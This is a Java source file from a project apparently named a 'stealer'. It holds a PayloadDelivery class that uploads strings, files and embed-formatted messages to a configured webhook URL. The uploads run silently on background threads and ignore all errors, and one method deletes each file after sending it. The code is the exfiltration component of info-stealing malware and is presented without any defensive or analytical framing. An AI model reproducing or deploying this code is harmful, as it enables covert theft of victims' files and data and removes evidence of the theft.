package dev.chaarlottte.stealer.util;

import com.squareup.okhttp.*;

import java.awt.*;
import java.io.File;
import dev.chaarlottte.stealer.Configuration;
import org.json.*;

public class PayloadDelivery {

    public static void send(Object item) {
        new Thread(() -> {try {
            Thread.sleep(1000);
            OkHttpClient client = new OkHttpClient();
            MultipartBuilder builder = new MultipartBuilder().type(MultipartBuilder.FORM);
            if (item instanceof String) builder.addFormDataPart("payload_json", "{\"content\":\"" + item + "\"}");
            else if (item instanceof File) builder.addFormDataPart("file1", ((File) item).getName(), RequestBody.create(MediaType.parse("application/octet-stream"), (File) item));
            else if (item instanceof WebhookMessage) {
                JSONObject obj = new JSONObject();
                JSONArray embeds = new JSONArray();
                JSONObject embed = new JSONObject();
                JSONArray fields = new JSONArray();
                ((WebhookMessage) item).getFields().forEach(field -> {
                    JSONObject f = new JSONObject();
                    f.put("name", field.getName());
                    f.put("value", field.getValue());
                    f.put("inline", field.isInline());
                    fields.put(f);
                });
                embed.put("title", ((WebhookMessage) item).getName());
                embed.put("fields", fields);
                if(!((WebhookMessage) item).getDescription().equals("blankdesc42")) {
                    embed.put("description", ((WebhookMessage) item).getDescription());
                }
                Color color = ((WebhookMessage) item).getColor();
                int rgb = color.getRed();
                rgb = (rgb << 8) + color.getGreen();
                rgb = (rgb << 8) + color.getBlue();
                embed.put("color", rgb);
                if(((WebhookMessage) item).getThumbnailUrl().length() > 1) {
                    embed.put("thumbnail", new JSONObject().put("url", ((WebhookMessage) item).getThumbnailUrl()));
                }
                embeds.put(embed);
                obj.put("embeds", embeds);
                builder.addFormDataPart("payload_json", obj.toString());
            }
            Request request = new Request.Builder().url(Configuration.WEBHOOK_URL).method("POST", builder.build()).build();
            client.newCall(request).execute().body().close();
        } catch (Exception ignored) {}}).start();
    }

    public static void sendFileThenDelete(File item) {
        new Thread(() -> {try {
            Thread.sleep(1000);
            OkHttpClient client = new OkHttpClient();
            MultipartBuilder builder = new MultipartBuilder().type(MultipartBuilder.FORM);builder.addFormDataPart("file1", ((File) item).getName(), RequestBody.create(MediaType.parse("application/octet-stream"), (File) item));
            Request request = new Request.Builder().url(Configuration.WEBHOOK_URL).method("POST", builder.build()).build();
            client.newCall(request).execute().body().close();
            item.delete();
        } catch (Exception ignored) {}}).start();
    }

}
